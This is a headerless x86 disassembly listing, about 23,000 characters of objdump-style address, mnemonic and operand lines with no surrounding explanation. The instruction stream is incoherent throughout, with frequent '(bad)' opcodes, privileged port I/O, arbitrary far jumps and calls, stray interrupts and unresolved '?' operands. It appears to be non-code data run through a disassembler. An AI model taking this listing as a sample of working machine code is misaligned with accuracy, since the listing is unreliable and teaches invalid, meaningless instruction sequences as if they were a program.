  4236a2:	jge    0x423630
  4236a4:	fisubr WORD PTR [edi-0x5f9995de]
  4236aa:	loope  0x42364b
  4236ac:	retf   
  4236ad:	xor    ebp,ebp
  4236af:	pop    eax
  4236b0:	popfw  
  4236b2:	call   FWORD PTR [ecx+0xd0a7696]
  4236b8:	fwait
  4236b9:	and    ebp,DWORD PTR [ebp*4-0x78013e5c]
  4236c0:	addr16 aam 0x8b
  4236c3:	sbb    BYTE PTR [ecx],ch
  4236c5:	push   edi
  4236c6:	jle    0x4236e8
  4236c8:	sbb    bl,BYTE PTR cs:[edx]
  4236cb:	(bad)  
  4236cc:	sbb    DWORD PTR [edi+0x1a36ec22],edx
  4236d2:	xchg   edx,eax
  4236d3:	cs adc eax,0x95743d80
  4236d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236da:	xor    ecx,DWORD PTR [eax+0x8]
  4236dd:	mov    dh,0x87
  4236df:	fldenv [ebp+0x28badeda]
  4236e5:	inc    eax
  4236e6:	xchg   edx,eax
  4236e7:	retf   
  4236e8:	dec    esp
  4236e9:	cmp    BYTE PTR [edi+0x43728a94],cl
  4236ef:	lods   eax,DWORD PTR ds:[esi]
  4236f0:	mov    bh,0xb1
  4236f2:	int    0xf3
  4236f4:	mov    eax,0xea1b12c
  4236f9:	in     eax,0xdb
  4236fb:	xor    al,0x39
  4236fd:	outs   dx,DWORD PTR ds:[esi]
  4236fe:	push   ss
  4236ff:	cmp    BYTE PTR [edi-0x6d],0x56
  423703:	or     ah,BYTE PTR [bp+di+0x54]
  423707:	jbe    0x423711
  423709:	outs   dx,BYTE PTR ds:[esi]
  42370a:	mov    al,0x87
  42370c:	sahf   
  42370d:	cmp    ecx,edx
  42370f:	dec    ebx
  423710:	pop    edi
  423711:	mov    ebx,0x42885027
  423716:	call   0x5a4b2d42
  42371b:	sub    BYTE PTR [ecx+0x31],bh
  42371e:	out    0x72,al
  423720:	or     eax,DWORD PTR [esp+ebp*8]
  423723:	pop    ds
  423724:	and    DWORD PTR [eax+0x5f],0xffffff93
  423728:	or     bl,0xf8
  42372b:	push   ss
  42372c:	mov    dl,0x6f
  42372e:	fistp  QWORD PTR [ecx+0xc]
  423731:	inc    edx
  423732:	fwait
  423733:	int3   
  423734:	jne    0x4236e0
  423736:	xor    al,0x22
  423738:	inc    edi
  423739:	pop    esp
  42373a:	mov    ecx,0xd82a9cb0
  42373f:	or     al,0xd9
  423741:	fisttp QWORD PTR [ebx+0x35758a8]
  423747:	push   edi
  423748:	xchg   ebx,eax
  423749:	xchg   ecx,eax
  42374a:	mov    es,WORD PTR [ebx+0x5c9295bf]
  423750:	add    DWORD PTR [edx+eax*1-0x7b489401],esi
  423757:	bound  eax,QWORD PTR [edx+0x5]
  42375a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42375b:	stc    
  42375c:	(bad)  
  42375e:	jmp    0xbfcc:0xa69febd1
  423765:	popf   
  423766:	mov    DWORD PTR [esi-0x7f01b82d],eax
  42376c:	imul   esp,DWORD PTR [esi-0x64228473],0x18
  423773:	ins    DWORD PTR es:[edi],dx
  423774:	inc    esp
  423775:	stos   DWORD PTR es:[edi],eax
  423776:	add    al,bh
  423778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423779:	pop    ds
  42377a:	add    esi,DWORD PTR [ecx+0x46]
  42377d:	popf   
  42377e:	and    al,0xe5
  423780:	fisttp WORD PTR [eax-0x2a8ef12c]
  423786:	bnd jmp 0x423798
  423789:	dec    ebp
  42378a:	sahf   
  42378b:	sub    BYTE PTR [eax+0x5838adaf],0xf2
  423792:	push   ebx
  423793:	lods   eax,DWORD PTR ds:[esi]
  423794:	push   esi
  423795:	cld    
  423796:	or     ecx,esp
  423798:	cmp    BYTE PTR [edx-0x16],0x3a
  42379c:	mov    esi,0xc9855f99
  4237a1:	mov    cl,0x8d
  4237a3:	in     ax,0x9f
  4237a6:	jno    0x4237fd
  4237a8:	sar    BYTE PTR [ecx],0x74
  4237ab:	jp     0x423806
  4237ad:	xchg   BYTE PTR [edi-0x79],cl
  4237b0:	cmp    DWORD PTR [ecx-0x4142a201],esp
  4237b6:	xchg   esi,eax
  4237b7:	mov    ch,0x42
  4237b9:	add    eax,0x5c827271
  4237be:	pushf  
  4237bf:	stos   BYTE PTR es:[edi],al
  4237c0:	imul   edi,ebx,0xffffffcb
  4237c3:	in     eax,dx
  4237c4:	cmp    BYTE PTR [ebx-0xf81e5ff],ah
  4237ca:	pop    ebp
  4237cb:	les    esp,FWORD PTR [ebp-0x3ce10408]
  4237d1:	mov    edi,DWORD PTR [ebp+0x53]
  4237d4:	pop    edx
  4237d5:	ds rcl bl,1
  4237d8:	aaa    
  4237d9:	pop    eax
  4237da:	lahf   
  4237db:	jmp    0x78a1:0x98195f1f
  4237e2:	popf   
  4237e3:	mov    ch,0xa8
  4237e5:	xor    BYTE PTR [eax],dh
  4237e7:	add    dl,0xb9
  4237ea:	(bad)  
  4237eb:	xor    ah,BYTE PTR [edx-0x48]
  4237ee:	pop    edi
  4237ef:	mov    bl,0xf4
  4237f1:	add    eax,0x9c120a08
  4237f6:	leave  
  4237f7:	xlat   BYTE PTR ds:[ebx]
  4237f8:	inc    ebx
  4237f9:	adc    DWORD PTR [ebp+0x2b4c934e],ebp
  4237ff:	stc    
  423800:	call   0x5cc9:0x6d0a3b1f
  423807:	xchg   esi,eax
  423808:	adc    cl,BYTE PTR [eax+0x2e]
  42380b:	and    eax,0x4a5d5166
  423810:	lods   al,BYTE PTR ds:[esi]
  423811:	int    0xaf
  423813:	repz pusha 
  423815:	jno    0x423809
  423817:	sbb    eax,0x6c8bfecc
  42381c:	dec    esi
  42381d:	cs sbb eax,0xb6ac8563
  423823:	ret    
  423824:	pop    ss
  423825:	imul   ebx,DWORD PTR [ecx-0x45],0x7b65e592
  42382c:	add    BYTE PTR [esi],dh
  42382e:	(bad)  [ebx+0x40]
  423831:	mov    esp,0x6200f076
  423836:	or     ebx,eax
  423838:	mov    ?,ecx
  42383a:	clc    
  42383b:	jnp    0x4237c2
  42383d:	aam    0x9b
  42383f:	out    dx,eax
  423840:	cmp    DWORD PTR [ebx+0x3d4db826],esi
  423846:	bswap  ecx
  423848:	mov    bh,ch
  42384a:	in     eax,0xc6
  42384c:	test   edi,edx
  42384e:	pop    ebx
  42384f:	mov    bl,bh
  423851:	mov    BYTE PTR [eax-0xb],cl
  423854:	dec    ecx
  423855:	mov    ebx,0x570a76d6
  42385a:	fild   DWORD PTR [edx-0x7fc4e535]
  423860:	inc    esp
  423861:	cmp    eax,0x5fde87fb
  423866:	div    BYTE PTR [eax+edx*2-0x27]
  42386a:	push   0x4894a233
  42386f:	jp     0x423862
  423871:	push   ds
  423872:	add    DWORD PTR [ebx+0x7e84ad8d],eax
  423878:	int    0x0
  42387a:	add    BYTE PTR [eax],al
  42387c:	inc    ebx
  42387d:	push   ebp
  42387e:	pusha  
  42387f:	(bad)  
  423880:	jbe    0x423841
  423882:	out    dx,eax
  423883:	fnstsw WORD PTR [edx+0x414356c3]
  423889:	jno    0x423834
  42388b:	scas   eax,DWORD PTR es:[edi]
  42388c:	cwde   
  42388d:	mov    dl,0x1
  42388f:	add    BYTE PTR [ebp-0x70fffffe],al
  423895:	and    al,0x84
  423897:	inc    edx
  423898:	clc    
  423899:	gs xchg ecx,eax
  42389b:	imul   eax,DWORD PTR [edx],0x3cff10a2
  4238a1:	pop    edi
  4238a2:	push   0xffffff95
  4238a4:	inc    ebx
  4238a5:	fs xchg ebx,eax
  4238a7:	cmp    esp,DWORD PTR [edi-0x68f33ea8]
  4238ad:	xchg   edx,eax
  4238ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4238af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238b0:	xor    al,0x82
  4238b2:	repz mov esp,0x1af59eb9
  4238b8:	es hlt 
  4238ba:	rcl    cl,cl
  4238bc:	push   es
  4238bd:	pushf  
  4238be:	inc    sp
  4238c0:	jp     0x423853
  4238c2:	mov    ah,BYTE PTR [ebp+0x5c33d57d]
  4238c8:	mov    esi,0xf797755b
  4238cd:	ret    
  4238ce:	adc    al,0xa0
  4238d0:	pop    ebp
  4238d1:	das    
  4238d2:	cli    
  4238d3:	push   ss
  4238d4:	mov    esp,0x7c82b2da
  4238d9:	fist   WORD PTR [edx]
  4238db:	ds jp  0x42394e
  4238de:	(bad)  
  4238df:	mov    ah,0xbc
  4238e1:	scas   eax,DWORD PTR es:[edi]
  4238e2:	scas   eax,DWORD PTR es:[edi]
  4238e3:	inc    edx
  4238e4:	mov    esi,0xc6989bf8
  4238e9:	push   ebp
  4238ea:	push   ds
  4238eb:	push   edi
  4238ec:	inc    edi
  4238ed:	sub    DWORD PTR [eax+0x3e],esi
  4238f0:	xor    DWORD PTR [ecx+0x48],ebp
  4238f3:	icebp  
  4238f4:	scas   al,BYTE PTR es:[edi]
  4238f5:	fisubr WORD PTR [ebx-0x7c]
  4238f8:	push   es
  4238f9:	das    
  4238fa:	mov    ch,0x1c
  4238fc:	daa    
  4238fd:	cmc    
  4238fe:	sub    eax,DWORD PTR [edi]
  423900:	ror    DWORD PTR [edx+0x3a],cl
  423903:	fsub   DWORD PTR ds:0x992e26d3
  423909:	add    eax,0x6251edb2
  42390e:	or     ah,dl
  423910:	pop    ebx
  423911:	cdq    
  423912:	push   0x1e
  423914:	je     0x423972
  423916:	aaa    
  423917:	and    DWORD PTR [ebx+0x74da9102],0x47
  42391e:	clc    
  42391f:	and    ecx,ebp
  423921:	jecxz  0x4238b2
  423923:	pop    edi
  423924:	jle    0x42398b
  423926:	pop    esi
  423927:	out    dx,al
  423928:	bound  ebp,QWORD PTR ds:0xb943e86
  42392e:	pop    ebx
  42392f:	or     BYTE PTR [ecx-0x5af72c2f],cl
  423935:	popa   
  423936:	shr    DWORD PTR [esi-0x740f3e9f],0xd8
  42393d:	dec    ebx
  42393e:	daa    
  42393f:	mov    edi,edi
  423941:	pop    esp
  423942:	shl    DWORD PTR [ecx+0x76af0a70],0x5c
  423949:	pusha  
  42394a:	into   
  42394b:	push   esp
  42394c:	xor    eax,0xfc360221
  423951:	xchg   edi,eax
  423952:	ins    BYTE PTR es:[edi],dx
  423953:	jl     0x423918
  423955:	inc    eax
  423956:	fistp  WORD PTR [ebp+0x497bc417]
  42395c:	(bad)  
  42395d:	mov    ah,0x19
  42395f:	outs   dx,BYTE PTR ds:[esi]
  423960:	in     al,0x5b
  423962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423963:	pop    ebp
  423964:	push   0x65399ff
  423969:	call   0x951c:0xa882a41f
  423970:	fcmovu st,st(2)
  423972:	(bad)  
  423974:	mov    eax,0xcc253ddc
  423979:	jp     0x4239f9
  42397b:	or     cl,BYTE PTR [edi]
  42397d:	mov    eax,0x9fe90ed3
  423982:	lods   eax,DWORD PTR ds:[esi]
  423983:	test   al,0x5c
  423985:	xchg   ecx,eax
  423986:	mov    ds:0x36fd8148,eax
  42398b:	mov    esp,0x146d772f
  423990:	jge    0x423995
  423992:	dec    ecx
  423993:	inc    ebp
  423994:	or     BYTE PTR fs:[ebp-0x76a28f4a],0xb9
  42399c:	jp     0x423940
  42399e:	gs inc esi
  4239a0:	repz loope 0x423984
  4239a3:	cmp    al,BYTE PTR [edi+0x7d334cee]
  4239a9:	out    0x3c,al
  4239ab:	fwait
  4239ac:	push   es
  4239ad:	jmp    0xd49d:0x77550228
  4239b4:	mov    al,0x34
  4239b6:	shl    BYTE PTR [ebp+0x4bb0898f],1
  4239bc:	dec    esi
  4239bd:	add    ch,cl
  4239bf:	inc    edx
  4239c0:	and    BYTE PTR [eax-0x2c],bl
  4239c3:	arpl   bx,di
  4239c5:	out    0xfd,al
  4239c7:	cmp    eax,0x63c01c6c
  4239cc:	pop    ds
  4239cd:	inc    esp
  4239ce:	nop
  4239cf:	daa    
  4239d0:	jmp    0x12c7:0xd1a7fce6
  4239d7:	pop    ss
  4239d8:	stc    
  4239d9:	ffree  st(6)
  4239db:	dec    edi
  4239dc:	xchg   ecx,eax
  4239dd:	push   ebx
  4239de:	(bad)  
  4239e0:	pop    es
  4239e1:	xchg   edx,eax
  4239e2:	test   DWORD PTR [ebp-0x5de159aa],esi
  4239e8:	daa    
  4239e9:	imul   esi,DWORD PTR [esi],0xffffffbb
  4239ec:	pushf  
  4239ed:	dec    esi
  4239ee:	mov    ds:0x736ac06b,eax
  4239f3:	dec    esi
  4239f4:	mov    esi,0x16a11c32
  4239f9:	fsubr  DWORD PTR [eax-0x74f4525f]
  4239ff:	int3   
  423a00:	inc    eax
  423a01:	jp     0x423a53
  423a03:	les    esi,FWORD PTR [eax]
  423a05:	mov    bh,BYTE PTR [edi-0x2b]
  423a08:	xchg   ebp,eax
  423a09:	push   es
  423a0a:	xor    eax,0x5917c945
  423a0f:	loope  0x4239a5
  423a11:	aam    0xc5
  423a13:	pusha  
  423a14:	mov    al,ds:0x9d8f7dbb
  423a19:	stos   DWORD PTR es:[edi],eax
  423a1a:	cmp    ah,BYTE PTR [eax+ecx*8+0x2]
  423a1e:	imul   eax,DWORD PTR [esp+eax*2+0x7],0x924954c6
  423a26:	push   es
  423a27:	and    DWORD PTR [esp+esi*2+0x5cc86063],0xb5fa0db4
  423a32:	lea    ebx,[ebx+0x29546e2d]
  423a38:	(bad)  
  423a39:	adc    DWORD PTR [ecx+0x7a],esp
  423a3c:	lods   al,BYTE PTR gs:[esi]
  423a3e:	ins    BYTE PTR es:[edi],dx
  423a3f:	imul   edi,DWORD PTR [ebx+0x40],0x2c
  423a43:	pushf  
  423a44:	aam    0x87
  423a46:	fldcw  WORD PTR [ecx+ecx*1+0x5f]
  423a4a:	in     al,dx
  423a4b:	push   eax
  423a4c:	mov    ds:0xe12efed1,eax
  423a51:	lahf   
  423a52:	mov    esp,0xa8df1d94
  423a57:	xchg   DWORD PTR [edx-0x78],ebx
  423a5a:	lds    eax,FWORD PTR [edx]
  423a5c:	adc    eax,0xaafa3478
  423a61:	pusha  
  423a62:	out    0x1b,al
  423a64:	gs dec ebp
  423a66:	push   esp
  423a67:	and    BYTE PTR [edi],dl
  423a69:	hlt    
  423a6a:	cmp    ch,ch
  423a6c:	(bad)  
  423a6d:	imul   esi,DWORD PTR [ebp+0x41],0x2b351f13
  423a74:	xchg   esi,eax
  423a75:	fst    QWORD PTR [ebp+0x57f4525a]
  423a7b:	ja     0x423a1e
  423a7d:	aas    
  423a7e:	xchg   ecx,eax
  423a7f:	sbb    BYTE PTR [esi+edx*8+0x2f],0x11
  423a84:	fcomp  st(4)
  423a86:	(bad)  
  423a87:	nop
  423a88:	arpl   WORD PTR [esi+0x9],bp
  423a8b:	cld    
  423a8c:	outs   dx,BYTE PTR ds:[esi]
  423a8d:	mov    cl,0xd5
  423a8f:	call   0x75927f9e
  423a94:	lahf   
  423a95:	mov    eax,DWORD PTR [esi]
  423a97:	dec    edx
  423a98:	call   0xfbd6:0xda8b3a1d
  423a9f:	xchg   al,al
  423aa1:	adc    eax,0x75827cb4
  423aa6:	xchg   ecx,eax
  423aa7:	push   esp
  423aa8:	pop    ebx
  423aa9:	int3   
  423aaa:	cli    
  423aab:	jp     0x423b25
  423aad:	shl    BYTE PTR [ebx-0x7b],cl
  423ab0:	pshufw mm1,QWORD PTR [ebx],0x1e
  423ab4:	in     eax,0x5c
  423ab6:	inc    ebx
  423ab7:	pop    esi
  423ab8:	in     eax,0x46
  423aba:	xchg   ebp,eax
  423abb:	xor    BYTE PTR [edx+ebx*2+0x48],dh
  423abf:	je     0x423af0
  423ac1:	mov    edi,DWORD PTR [edx+0x4de96294]
  423ac7:	dec    eax
  423ac8:	or     al,0x9f
  423aca:	test   BYTE PTR [ecx+0x7c8829ca],al
  423ad0:	pop    eax
  423ad1:	repnz lock and ebp,DWORD PTR [esi]
  423ad5:	sub    dh,BYTE PTR [esi+0x5d3ae111]
  423adb:	inc    ebp
  423adc:	xchg   edx,eax
  423add:	(bad)  
  423ade:	lock xchg ebx,eax
  423ae0:	test   BYTE PTR [edi+0x6fec0d61],ch
  423ae6:	test   DWORD PTR [ebx],edi
  423ae8:	ja     0x423a85
  423aea:	inc    ebp
  423aeb:	jecxz  0x423a7c
  423aed:	jbe    0x423b2d
  423aef:	dec    ebx
  423af0:	mov    WORD PTR [ecx-0x5b],?
  423af3:	sahf   
  423af4:	dec    edi
  423af5:	pop    ecx
  423af6:	push   ebp
  423af7:	cmp    al,0xda
  423af9:	jb     0x423abe
  423afb:	adc    al,0x77
  423afd:	jo     0x423ae8
  423aff:	call   0x999e6cd8
  423b04:	fstp   QWORD PTR [esi+0x59]
  423b07:	cmp    bl,0xbc
  423b0a:	imul   edi,edx,0x99f2d85f
  423b10:	sbb    DWORD PTR [ebx+0x600f1082],eax
  423b16:	ret    0x29ac
  423b19:	add    BYTE PTR [eax],al
  423b1b:	add    BYTE PTR [edi+0x2d],dl
  423b1e:	pop    es
  423b1f:	call   0x55de:0xeddfba7f
  423b26:	inc    ecx
  423b27:	adc    al,0xf
  423b29:	loop   0x423b54
  423b2b:	mov    cl,0x1d
  423b2d:	mov    ch,0x1
  423b2f:	add    BYTE PTR [ebp+0x73000002],al
  423b35:	aam    0x60
  423b37:	or     ebx,DWORD PTR [esi+0x73]
  423b3a:	gs cmp bl,0x4b
  423b3e:	(bad)
  423b41:	mov    BYTE PTR [ebx],al
  423b43:	xchg   al,bl
  423b45:	lds    ebx,FWORD PTR [edx+0x14]
  423b48:	xor    eax,0x170468c0
  423b4d:	mov    ah,0x46
  423b4f:	mov    ebx,0x6d840d76
  423b54:	pusha  
  423b55:	lds    eax,FWORD PTR [edi-0x3afe59f9]
  423b5b:	pop    edi
  423b5c:	jp     0x423b8c
  423b5e:	xchg   esp,eax
  423b5f:	xchg   esp,eax
  423b60:	sbb    esp,0xcd3cc4c2
  423b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b67:	ins    BYTE PTR es:[edi],dx
  423b68:	mov    al,ds:0xabfd8bab
  423b6d:	mov    ds:0x16b32121,eax
  423b72:	fidivr DWORD PTR [edx-0x16ee0dfb]
  423b78:	mov    dh,0xcd
  423b7a:	sbb    dh,BYTE PTR [esi+0x40]
  423b7d:	call   0xd0798d48
  423b82:	sbb    BYTE PTR [ebx+0x3cf1dd45],bl
  423b88:	into   
  423b89:	jb     0x423b7f
  423b8b:	pop    edx
  423b8c:	pop    ss
  423b8d:	push   esi
  423b8e:	fs retf 
  423b90:	mov    ah,0xd5
  423b92:	repz stc 
  423b94:	sub    al,dl
  423b96:	(bad)  
  423b97:	mov    dl,0xd6
  423b99:	mov    dh,0x5b
  423b9b:	(bad)  
  423b9d:	mov    cl,0xd6
  423b9f:	lock mov eax,ds:0x6695f53d
  423ba5:	adc    al,0xf1
  423ba7:	gs clc 
  423ba9:	xor    BYTE PTR [edi],0x58
  423bac:	mov    dl,BYTE PTR [eax+0x6dffb204]
  423bb2:	das    
  423bb3:	pop    ebx
  423bb4:	push   ecx
  423bb5:	mov    ds:0x4028a4c8,al
  423bba:	push   ebp
  423bbb:	out    0xf0,eax
  423bbd:	xor    eax,0xd1a53d50
  423bc2:	fbld   TBYTE PTR [edi+0x22]
  423bc5:	and    ebx,DWORD PTR [edx+0x414e9bf1]
  423bcb:	ficom  DWORD PTR [edx+0x1feb6d1d]
  423bd1:	sbb    eax,0xfcb4da19
  423bd6:	jp     0x423b90
  423bd8:	les    edx,FWORD PTR ds:0xa26cea22
  423bde:	mov    edx,0x518f7988
  423be3:	shr    BYTE PTR [ebp+0x9ccdd3b],1
  423be9:	push   ds
  423bea:	sbb    eax,0xd2000a29
  423bef:	fidivr DWORD PTR [ebx+0x7d6f9496]
  423bf5:	arpl   WORD PTR [ecx+0xb],dx
  423bf8:	pop    esp
  423bf9:	mov    BYTE PTR gs:[ecx],0x6b
  423bfd:	push   ebp
  423bfe:	mov    cl,0xbd
  423c00:	fild   DWORD PTR [esi]
  423c02:	outs   dx,BYTE PTR ds:[esi]
  423c03:	and    al,0xdd
  423c05:	sub    BYTE PTR [ecx-0xb],dh
  423c08:	fisub  DWORD PTR [ebp+0x18aee728]
  423c0e:	daa    
  423c0f:	xor    cl,BYTE PTR ds:0x55ceee9b
  423c15:	xor    edi,DWORD PTR [ecx+eiz*1]
  423c18:	sub    bl,BYTE PTR [esp+ebx*4]
  423c1b:	cmp    ch,BYTE PTR [edx-0x5b69092]
  423c21:	les    esp,FWORD PTR [ebp+0x55ac0e24]
  423c27:	fwait
  423c28:	push   ebp
  423c29:	push   ebx
  423c2a:	adc    esp,esp
  423c2c:	mov    ah,0x83
  423c2e:	stos   DWORD PTR es:[edi],eax
  423c2f:	push   ss
  423c30:	mov    edx,0x6f74da51
  423c35:	adc    al,BYTE PTR [esp+ecx*2+0x7b627be2]
  423c3c:	jno    0x423c9c
  423c3e:	inc    esp
  423c3f:	lods   eax,DWORD PTR ds:[esi]
  423c40:	adc    DWORD PTR [ebp-0x48],eax
  423c43:	sbb    BYTE PTR [ecx-0x4e891738],dl
  423c49:	add    al,0x4d
  423c4b:	not    BYTE PTR [ebp+0x4bd8e2e0]
  423c51:	xchg   ebx,edx
  423c53:	stos   DWORD PTR es:[edi],eax
  423c54:	mov    edx,0x42589596
  423c59:	repnz dec esi
  423c5b:	and    cl,BYTE PTR [eax-0x1b]
  423c5e:	cmp    DWORD PTR [edi+0xc],ebx
  423c61:	out    dx,al
  423c62:	dec    esp
  423c63:	xor    DWORD PTR [eax],ebx
  423c65:	icebp  
  423c66:	(bad)  [edx+edx*1]
  423c69:	xchg   ecx,eax
  423c6a:	xor    esi,ecx
  423c6c:	mov    cl,0xd7
  423c6e:	gs pusha 
  423c70:	xor    edi,DWORD PTR [ecx]
  423c72:	inc    ecx
  423c73:	gs fs dec ebp
  423c76:	adc    eax,0x5113fcfd
  423c7b:	sub    eax,0x16287412
  423c80:	jo     0x423cf1
  423c82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423c83:	pop    edx
  423c84:	push   ds
  423c85:	cmp    ah,BYTE PTR [eax]
  423c87:	test   al,0x87
  423c89:	(bad)  
  423c8a:	xor    esi,DWORD PTR [edx+eax*1]
  423c8d:	std    
  423c8e:	(bad)  
  423c8f:	out    dx,eax
  423c90:	mov    al,0x3e
  423c92:	pop    esp
  423c93:	pop    eax
  423c94:	push   ss
  423c95:	sub    eax,0xba12fb14
  423c9a:	bound  ecx,QWORD PTR [eax]
  423c9c:	push   0xd10c1438
  423ca1:	scas   al,BYTE PTR es:[edi]
  423ca2:	loope  0x423ceb
  423ca4:	sub    BYTE PTR [esi-0x4426ab41],dh
  423caa:	jmp    0x423cac
  423cac:	add    ebp,edi
  423cae:	aam    0xbd
  423cb0:	jnp    0x423c93
  423cb2:	aas    
  423cb3:	ins    DWORD PTR es:[edi],dx
  423cb4:	fwait
  423cb5:	adc    al,0xa3
  423cb7:	ret    0xe958
  423cba:	adc    ch,0xb9
  423cbd:	std    
  423cbe:	mov    bl,dl
  423cc0:	(bad)  
  423cc1:	push   ss
  423cc2:	in     al,dx
  423cc3:	outs   dx,BYTE PTR ds:[esi]
  423cc4:	adc    eax,0x1d5bbea3
  423cc9:	xchg   esi,eax
  423cca:	lahf   
  423ccb:	aam    0x33
  423ccd:	aaa    
  423cce:	xchg   cl,dh
  423cd0:	call   0xe705:0x77a77e10
  423cd7:	or     edi,eax
  423cd9:	sbb    BYTE PTR [ecx],al
  423cdb:	loop   0x423d1d
  423cdd:	leave  
  423cde:	pop    ebp
  423cdf:	pop    ss
  423ce0:	add    BYTE PTR [eax+ebp*4-0x7be012a0],ch
  423ce7:	mov    edi,DWORD PTR [ebx-0x2e]
  423cea:	jle    0x423d1b
  423cec:	(bad)  
  423ced:	fld    TBYTE PTR ds:0x6f0b1a0b
  423cf3:	mul    ebp
  423cf5:	lock jo 0x423d22
  423cf8:	xor    al,ch
  423cfa:	sub    edi,edi
  423cfc:	in     eax,0x52
  423cfe:	sbb    BYTE PTR [ebp+0x3d0b1349],0x16
  423d05:	data16 std 
  423d07:	lock pop es
  423d09:	lods   al,BYTE PTR ds:[esi]
  423d0a:	popf   
  423d0b:	mov    ds:0x15809522,eax
  423d10:	mov    al,0x41
  423d12:	add    DWORD PTR [ebp-0x77],edi
  423d15:	jecxz  0x423c9f
  423d17:	push   0xffffffe8
  423d19:	dec    esi
  423d1a:	pushf  
  423d1b:	pusha  
  423d1c:	mov    bl,0x9e
  423d1e:	addr16 das 
  423d20:	adc    DWORD PTR [eax],edi
  423d22:	inc    ecx
  423d23:	scas   eax,DWORD PTR es:[edi]
  423d24:	adc    ebp,DWORD PTR [edx+eax*1+0x33]
  423d28:	push   esi
  423d29:	loope  0x423cc0
  423d2b:	outs   dx,WORD PTR ds:[esi]
  423d2d:	fdivrp st(7),st
  423d2f:	in     al,0x5c
  423d31:	div    DWORD PTR [ecx]
  423d33:	pushf  
  423d34:	ins    DWORD PTR es:[edi],dx
  423d35:	pop    ecx
  423d36:	mov    gs,ebp
  423d38:	or     BYTE PTR ds:0x518e388f,cl
  423d3e:	add    bh,al
  423d40:	call   0x41d970a2
  423d45:	inc    edx
  423d46:	push   0xb3cbdd54
  423d4b:	shl    dl,0x3b
  423d4e:	and    eax,0xb75a3862
  423d53:	(bad)  
  423d54:	aam    0x27
  423d56:	push   esp
  423d57:	mov    eax,0xf83215c7
  423d5c:	inc    eax
  423d5d:	ret    0x5606
  423d60:	fisubr DWORD PTR [ebx+0x16fe9225]
  423d66:	daa    
  423d67:	adc    eax,0x144c6676
  423d6c:	or     BYTE PTR [edx],0xfc
  423d6f:	(bad)  
  423d70:	cld    
  423d71:	inc    eax
  423d72:	jae    0x423d3a
  423d74:	and    DWORD PTR [ecx+0x229d36bd],ebx
  423d7a:	out    dx,eax
  423d7b:	jmp    0x3855:0xc3264b0d
  423d82:	adc    bh,bl
  423d84:	jbe    0x423d28
  423d86:	retf   
  423d87:	(bad)  
  423d88:	ficom  WORD PTR [esi+0x4ee4b519]
  423d8e:	test   BYTE PTR [esi+0x13],ah
  423d91:	xor    eax,DWORD PTR [edx-0x39]
  423d94:	jecxz  0x423d75
  423d96:	pop    edi
  423d97:	shr    BYTE PTR [edi],cl
  423d99:	push   es
  423d9a:	add    eax,0xc9ad7e65
  423d9f:	mov    esp,0xb8ef8cb1
  423da4:	(bad)  
  423da5:	mov    edi,0xf2b389a3
  423daa:	clc    
  423dab:	repz pop eax
  423dad:	pop    edx
  423dae:	call   0x9a197a96
  423db3:	pop    esp
  423db4:	lods   al,BYTE PTR ds:[esi]
  423db5:	iret   
  423db6:	dec    ebp
  423db7:	dec    eax
  423db8:	test   BYTE PTR [eax],al
  423dba:	add    BYTE PTR [eax],al
  423dbc:	ins    BYTE PTR es:[edi],dx
  423dbd:	sub    ch,BYTE PTR [ebx]
  423dbf:	outs   dx,DWORD PTR es:[esi]
  423dc1:	daa    
  423dc2:	ins    DWORD PTR es:[edi],dx
  423dc3:	push   0xfffffff2
  423dc5:	push   esp
  423dc6:	stos   DWORD PTR es:[edi],eax
  423dc7:	adc    edi,DWORD PTR [esi+0x3f]
  423dca:	or     eax,0x1b7a2d2
  423dcf:	add    BYTE PTR [ebp+0x7000002],al
  423dd5:	leave  
  423dd6:	dec    edx
  423dd7:	pop    ss
  423dd8:	sub    eax,0x53ace564
  423ddd:	je     0x423df6
  423ddf:	sbb    BYTE PTR [ecx+ebx*1+0x89ac087],bl
  423de6:	or     ebp,esp
  423de8:	pop    ecx
  423de9:	jns    0x423d83
  423deb:	jb     0x423e22
  423ded:	push   ecx
  423dee:	mov    ebx,0x3d6848c6
  423df3:	out    dx,al
  423df4:	push   0xffffff8b
  423df6:	scas   eax,DWORD PTR es:[edi]
  423df7:	inc    ebx
  423df8:	jbe    0x423de5
  423dfa:	scas   al,BYTE PTR es:[edi]
  423dfb:	fst    DWORD PTR [esp+ecx*2+0x5c8e6139]
  423e02:	sar    BYTE PTR [ecx-0x3f340c50],cl
  423e08:	pop    esp
  423e09:	aas    
  423e0a:	push   es
  423e0b:	jg     0x423e23
  423e0d:	dec    edi
  423e0e:	dec    esp
  423e0f:	xchg   edx,eax
  423e10:	inc    esi
  423e11:	or     ebp,ecx
  423e13:	mov    edx,0x835ddf47
  423e18:	test   al,0x9
  423e1a:	mov    edi,0x621ff7a3
  423e1f:	test   DWORD PTR [esi-0x43698d1d],esp
  423e25:	addr16 sar ebp,cl
  423e28:	jae    0x423e18
  423e2a:	div    BYTE PTR [esi-0x57faa224]
  423e30:	push   es
  423e31:	shr    BYTE PTR [ecx],cl
  423e33:	and    edx,DWORD PTR [ecx]
  423e35:	jae    0x423e6d
  423e37:	push   edi
  423e38:	mov    bh,BYTE PTR [ebx]
  423e3a:	push   0xffffffd1
  423e3c:	cmp    bh,BYTE PTR [ecx-0x28b053ff]
  423e42:	aad    0xf6
  423e44:	(bad)  
  423e45:	div    bl
  423e47:	jmp    0x57f2c503
  423e4c:	ss sti 
  423e4e:	xor    bl,bl
  423e50:	stc    
  423e51:	push   ecx
  423e52:	inc    edi
  423e53:	xor    eax,0x19d16b2
  423e58:	jnp    0x423ec9
  423e5a:	jle    0x423e4c
  423e5c:	es mov si,0x3c5c
  423e61:	test   al,0x49
  423e63:	mov    eax,DWORD PTR [ebx+0x73f1515f]
  423e69:	dec    ecx
  423e6a:	aad    0x49
  423e6c:	inc    esp
  423e6d:	cmc    
  423e6e:	jb     0x423e4c
  423e70:	(bad)  
  423e71:	dec    esp
  423e72:	sti    
  423e73:	sahf   
  423e74:	cmc    
  423e75:	out    0x2e,al
  423e77:	push   0x828fb4f9
  423e7c:	push   es
  423e7d:	sahf   
